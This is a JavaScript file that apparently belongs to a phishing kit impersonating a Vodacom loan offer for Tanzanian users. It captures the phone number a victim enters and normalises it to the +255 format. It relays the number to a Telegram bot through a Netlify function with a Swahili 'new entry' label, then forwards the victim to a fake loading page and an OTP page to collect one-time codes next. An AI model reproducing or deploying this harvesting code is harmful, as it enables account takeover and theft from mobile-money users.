document.addEventListener('DOMContentLoaded', () => {
    const phoneInput = document.getElementById('app-phone');
    const confirmBtn = document.querySelector('.confirm-button');
    const phoneDigitsOnly = (value) => value.replace(/\D/g, '');

    let isSubmitting = false;

    async function sendToTelegram(message) {
        try {
            await fetch('/.netlify/functions/send-telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message })
            });
        } catch (error) {
            console.error('Telegram error:', error);
        }
    }

    function normalizePhoneForCountryCode(value) {
        const digits = phoneDigitsOnly(value);
        if (digits.length === 10 && digits.startsWith('0')) {
            return digits.slice(1);
        }
        if (digits.length === 9) {
            return digits;
        }
        return '';
    }

    phoneInput.addEventListener('input', () => {
        phoneInput.value = phoneDigitsOnly(phoneInput.value).slice(0, 10);
    });

    // Button submit effect
    confirmBtn.addEventListener('click', async () => {
        const normalizedPhone = normalizePhoneForCountryCode(phoneInput.value);
        if (normalizedPhone && !isSubmitting) {
            isSubmitting = true;
            confirmBtn.style.opacity = '0.5';
            confirmBtn.style.pointerEvents = 'none';
            await sendToTelegram(`<b>Vodacom Loan - Kuingia Mapya</b>\nSimu: <code>+255${normalizedPhone}</code>`);
            window.location.href = 'loading.html?next=otp.html&delay=3000';
        } else if (!normalizedPhone) {
            alert('Weka namba sahihi yenye tarakimu 9 (au 10 ikianza na 0).');
        }
    });
});
